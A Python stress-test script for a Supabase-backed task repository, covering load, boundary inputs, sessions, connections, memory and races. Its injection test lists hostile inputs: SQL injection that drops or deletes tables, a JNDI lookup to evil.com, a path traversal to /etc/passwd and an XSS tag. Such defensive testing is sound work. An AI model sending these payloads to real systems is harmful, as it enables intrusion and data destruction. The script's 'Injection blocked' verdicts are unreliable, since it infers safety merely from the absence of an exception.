#!/usr/bin/env python3
"""
Aggressive Problem Detection - Finding hidden issues
"""

import time
import sys
import os
import random
import string
import gc
from datetime import datetime, timedelta
import json

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

def generate_random_string(length):
    """Generate random string for testing"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def main():
    print("="*70)
    print("⚡ AGGRESSIVE PROBLEM DETECTION - STRESS TESTING")
    print("="*70)
    print(f"Test Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*70)
    
    problems_found = []
    
    try:
        from fastmcp.task_management.infrastructure.repositories.orm.supabase_optimized_repository import SupabaseOptimizedRepository
        
        print("\n🔥 TEST 1: Extreme Load Test")
        print("-" * 50)
        
        repo = SupabaseOptimizedRepository()
        print("Executing 100 queries rapidly...")
        
        start_time = time.time()
        errors = 0
        slowest = 0
        fastest = float('inf')
        
        for i in range(100):
            try:
                query_start = time.time()
                result = repo.list_tasks_minimal(limit=random.randint(1, 50))
                query_time = (time.time() - query_start) * 1000
                
                if query_time > slowest:
                    slowest = query_time
                if query_time < fastest:
                    fastest = query_time
                    
                if query_time > 1000:  # More than 1 second
                    problems_found.append({
                        "issue": f"Slow query under load",
                        "severity": "Medium",
                        "details": f"Query {i} took {query_time:.2f}ms",
                        "impact": "Performance degradation under load"
                    })
                    
            except Exception as e:
                errors += 1
                problems_found.append({
                    "issue": f"Query failed under load",
                    "severity": "High",
                    "details": f"Query {i}: {str(e)[:100]}",
                    "impact": "System instability under load"
                })
        
        total_time = time.time() - start_time
        avg_time = (total_time * 1000) / 100
        
        print(f"Results:")
        print(f"  Total time: {total_time:.2f}s")
        print(f"  Average: {avg_time:.2f}ms")
        print(f"  Fastest: {fastest:.2f}ms")
        print(f"  Slowest: {slowest:.2f}ms")
        print(f"  Errors: {errors}")
        
        if errors > 5:
            print("⚠️ Problem: Too many errors under load")
        elif slowest > 1000:
            print("⚠️ Problem: Some queries too slow")
        else:
            print("✅ Load test passed")
        
        print("\n🔥 TEST 2: Parameter Boundary Testing")
        print("-" * 50)
        
        boundary_tests = [
            ("Zero limit", lambda: repo.list_tasks_minimal(limit=0)),
            ("Massive limit", lambda: repo.list_tasks_minimal(limit=999999)),
            ("Negative offset", lambda: repo.list_tasks_minimal(offset=-100)),
            ("Massive offset", lambda: repo.list_tasks_minimal(offset=999999)),
            ("Empty string status", lambda: repo.list_tasks_minimal(status="")),
            ("Very long status", lambda: repo.list_tasks_minimal(status="x" * 10000)),
            ("Integer as status", lambda: repo.list_tasks_minimal(status=123)),
            ("None as limit", lambda: repo.list_tasks_minimal(limit=None)),
            ("Float as limit", lambda: repo.list_tasks_minimal(limit=10.5)),
            ("List as status", lambda: repo.list_tasks_minimal(status=["todo", "done"])),
        ]
        
        for test_name, test_func in boundary_tests:
            try:
                result = test_func()
                print(f"  {test_name}: Handled ({len(result) if result else 0} results)")
            except Exception as e:
                error_type = type(e).__name__
                if error_type in ['TypeError', 'ValueError', 'AttributeError']:
                    print(f"  {test_name}: Expected error - {error_type}")
                else:
                    problems_found.append({
                        "issue": f"Unexpected error for {test_name}",
                        "severity": "Low",
                        "details": str(e)[:100],
                        "impact": "Poor error handling"
                    })
                    print(f"  {test_name}: UNEXPECTED ERROR - {str(e)[:50]}")
        
        print("\n🔥 TEST 3: Session Management Stress")
        print("-" * 50)
        
        print("Creating and destroying sessions rapidly...")
        for i in range(50):
            try:
                with repo.get_db_session() as session:
                    # Intentionally do nothing - testing session creation/destruction
                    pass
            except Exception as e:
                problems_found.append({
                    "issue": "Session management failure",
                    "severity": "High",
                    "details": f"Session {i}: {str(e)[:100]}",
                    "impact": "Database connection issues"
                })
                print(f"⚠️ Session {i} failed: {str(e)[:50]}")
                break
        else:
            print("✅ All 50 sessions created and destroyed successfully")
        
        print("\n🔥 TEST 4: Query Injection Attempts")
        print("-" * 50)
        
        injection_tests = [
            "' OR '1'='1",
            "'; DROP TABLE tasks; --",
            "1; DELETE FROM tasks WHERE 1=1",
            "' UNION SELECT * FROM users --",
            "\\x00\\x01\\x02\\x03",
            "${jndi:ldap://evil.com/a}",
            "../../../etc/passwd",
            "<script>alert('xss')</script>",
        ]
        
        for injection in injection_tests:
            try:
                result = repo.list_tasks_minimal(status=injection)
                print(f"  Injection blocked: {injection[:30]}")
            except Exception as e:
                if "DROP TABLE" in str(e) or "DELETE FROM" in str(e):
                    problems_found.append({
                        "issue": "SQL injection vulnerability",
                        "severity": "Critical",
                        "details": f"Injection not properly blocked: {injection}",
                        "impact": "Security vulnerability"
                    })
                    print(f"⚠️ CRITICAL: Injection not blocked properly!")
                else:
                    print(f"  Injection handled: {injection[:30]}")
        
        print("\n🔥 TEST 5: Database Connection Stability")
        print("-" * 50)
        
        print("Testing connection recovery...")
        
        # First, make a normal query
        try:
            result1 = repo.list_tasks_minimal(limit=5)
            print(f"  Initial query: {len(result1)} results")
        except:
            print("  Initial query failed")
        
        # Simulate connection issue by creating many repos
        repos = []
        try:
            for i in range(30):  # Try to exhaust connections
                r = SupabaseOptimizedRepository()
                repos.append(r)
                r.list_tasks_minimal(limit=1)
            print(f"  Created {len(repos)} repository instances")
        except Exception as e:
            print(f"  Connection limit reached at {len(repos)} repos")
        
        # Clean up
        repos.clear()
        gc.collect()
        time.sleep(1)
        
        # Try to query again
        try:
            result2 = repo.list_tasks_minimal(limit=5)
            print(f"  Recovery query: {len(result2)} results")
            print("✅ Connection recovered after stress")
        except Exception as e:
            problems_found.append({
                "issue": "Connection recovery failure",
                "severity": "High",
                "details": str(e)[:100],
                "impact": "System cannot recover from connection issues"
            })
            print(f"⚠️ Connection recovery failed: {str(e)[:50]}")
        
        print("\n🔥 TEST 6: Timeout Behavior")
        print("-" * 50)
        
        print("Testing with very large dataset request...")
        try:
            start = time.time()
            result = repo.list_tasks_minimal(limit=10000)  # Request huge dataset
            elapsed = time.time() - start
            
            if elapsed > 5:
                problems_found.append({
                    "issue": "No query timeout protection",
                    "severity": "Medium",
                    "details": f"Query took {elapsed:.2f}s without timeout",
                    "impact": "Long queries can block system"
                })
                print(f"⚠️ Query took {elapsed:.2f}s - no timeout protection")
            else:
                print(f"✅ Large query completed in {elapsed:.2f}s")
        except Exception as e:
            print(f"  Query failed/timed out: {str(e)[:50]}")
        
        print("\n🔥 TEST 7: Memory Pressure Test")
        print("-" * 50)
        
        print("Accumulating results in memory...")
        all_results = []
        memory_error = False
        
        try:
            for i in range(100):
                results = repo.list_tasks_minimal(limit=50)
                all_results.extend(results)
                
                if i % 20 == 0:
                    result_count = len(all_results)
                    print(f"  Accumulated {result_count} results")
                    
                    # Check if results are being cached inappropriately
                    if result_count > 5000:
                        problems_found.append({
                            "issue": "Excessive memory usage",
                            "severity": "Medium",
                            "details": f"Accumulated {result_count} results in memory",
                            "impact": "Memory exhaustion risk"
                        })
                        memory_error = True
                        break
                        
        except MemoryError as e:
            problems_found.append({
                "issue": "Memory exhaustion",
                "severity": "High",
                "details": "Out of memory during testing",
                "impact": "System can run out of memory"
            })
            print("⚠️ Memory exhaustion detected!")
            memory_error = True
        
        if not memory_error:
            print(f"✅ Memory test passed ({len(all_results)} results)")
        
        all_results.clear()
        gc.collect()
        
        print("\n🔥 TEST 8: Race Condition Detection")
        print("-" * 50)
        
        import threading
        race_detected = False
        results_dict = {}
        
        def race_test(thread_id):
            try:
                repo = SupabaseOptimizedRepository()
                result = repo.list_tasks_minimal(limit=10)
                results_dict[thread_id] = len(result)
            except Exception as e:
                results_dict[thread_id] = f"ERROR: {str(e)[:30]}"
        
        # Launch threads simultaneously
        threads = []
        for i in range(10):
            t = threading.Thread(target=race_test, args=(i,))
            threads.append(t)
        
        # Start all threads at once
        for t in threads:
            t.start()
        
        # Wait for completion
        for t in threads:
            t.join()
        
        # Check for inconsistencies
        unique_results = set(v for v in results_dict.values() if isinstance(v, int))
        if len(unique_results) > 1:
            problems_found.append({
                "issue": "Race condition detected",
                "severity": "High",
                "details": f"Different results from simultaneous queries: {unique_results}",
                "impact": "Data inconsistency under concurrent access"
            })
            print(f"⚠️ Race condition: Different results {unique_results}")
        else:
            print("✅ No race conditions detected")
        
        print("\n🔥 TEST 9: Error Propagation")
        print("-" * 50)
        
        # Test if errors are properly propagated
        try:
            # Force an error with invalid UUID
            import uuid
            invalid_id = "this-is-not-a-uuid"
            repo_with_invalid_id = SupabaseOptimizedRepository(git_branch_id=invalid_id)
            result = repo_with_invalid_id.list_tasks_minimal()
            
            # If we get here, error wasn't caught properly
            problems_found.append({
                "issue": "Invalid UUID not validated",
                "severity": "Medium",
                "details": "Repository accepts invalid UUID format",
                "impact": "Database errors not prevented"
            })
            print("⚠️ Invalid UUID not validated at repository level")
            
        except Exception as e:
            print(f"✅ Invalid UUID properly rejected: {type(e).__name__}")
        
        print("\n🔥 TEST 10: State Consistency")
        print("-" * 50)
        
        # Check if repository maintains consistent state
        repo = SupabaseOptimizedRepository()
        
        # Get initial results
        results1 = repo.list_tasks_minimal(limit=5)
        
        # Make multiple queries
        for _ in range(10):
            repo.list_tasks_minimal(limit=5)
        
        # Get results again
        results2 = repo.list_tasks_minimal(limit=5)
        
        # Check if results are consistent (assuming no data changes)
        if len(results1) != len(results2):
            problems_found.append({
                "issue": "State inconsistency",
                "severity": "Medium",
                "details": f"Result count changed: {len(results1)} -> {len(results2)}",
                "impact": "Repository state may be corrupted"
            })
            print(f"⚠️ State inconsistency detected: {len(results1)} -> {len(results2)}")
        else:
            print("✅ Repository state remains consistent")
        
    except Exception as e:
        print(f"\n❌ Critical Test Error: {e}")
        import traceback
        traceback.print_exc()
        problems_found.append({
            "issue": "Test framework failure",
            "severity": "Critical",
            "details": str(e),
            "impact": "Cannot complete diagnostic"
        })
    
    # Final Report
    print("\n" + "="*70)
    print("📋 AGGRESSIVE TEST SUMMARY")
    print("="*70)
    
    if not problems_found:
        print("\n🎉 NO PROBLEMS FOUND!")
        print("System passed all aggressive stress tests.")
    else:
        print(f"\n⚠️ FOUND {len(problems_found)} POTENTIAL ISSUES:\n")
        
        # Group by severity
        critical = [p for p in problems_found if p["severity"] == "Critical"]
        high = [p for p in problems_found if p["severity"] == "High"]
        medium = [p for p in problems_found if p["severity"] == "Medium"]
        low = [p for p in problems_found if p["severity"] == "Low"]
        
        if critical:
            print("🔴 CRITICAL ISSUES:")
            for p in critical:
                print(f"  - {p['issue']}")
                print(f"    {p['details'][:100]}\n")
        
        if high:
            print("🟠 HIGH PRIORITY:")
            for p in high:
                print(f"  - {p['issue']}")
                print(f"    {p['details'][:100]}\n")
        
        if medium:
            print("🟡 MEDIUM PRIORITY:")
            for p in medium:
                print(f"  - {p['issue']}")
                print(f"    {p['details'][:100]}\n")
        
        if low:
            print("🟢 LOW PRIORITY:")
            for p in low:
                print(f"  - {p['issue']}")
                print(f"    {p['details'][:100]}\n")
    
    # Save report
    report = {
        "test_date": datetime.now().isoformat(),
        "test_type": "aggressive_stress_test",
        "problems_found": len(problems_found),
        "issues": problems_found
    }
    
    with open("aggressive_test_report.json", "w") as f:
        json.dump(report, f, indent=2)
    
    print(f"\n📄 Report saved to: aggressive_test_report.json")
    print(f"Total issues found: {len(problems_found)}")
    print("="*70)

if __name__ == "__main__":
    main()